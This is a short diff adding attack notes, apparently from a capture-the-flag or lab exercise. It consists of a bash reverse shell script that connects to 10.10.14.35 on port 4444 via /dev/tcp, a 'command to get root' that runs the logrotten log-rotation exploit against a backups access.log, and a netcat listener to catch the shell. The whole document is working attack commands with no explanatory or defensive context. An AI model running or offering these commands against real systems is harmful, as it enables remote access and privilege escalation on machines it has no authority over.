@@ -1,0 +1,9 @@
+bash shell script: 
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.10.14.35/4444 0>&1
+
+command to get root:
+cp ~/backups/access.log.1 ~/backups/access.log; ./logrotten -p bashs.sh /home/reader/backups/access.log
+
+nc -nvlp 4444
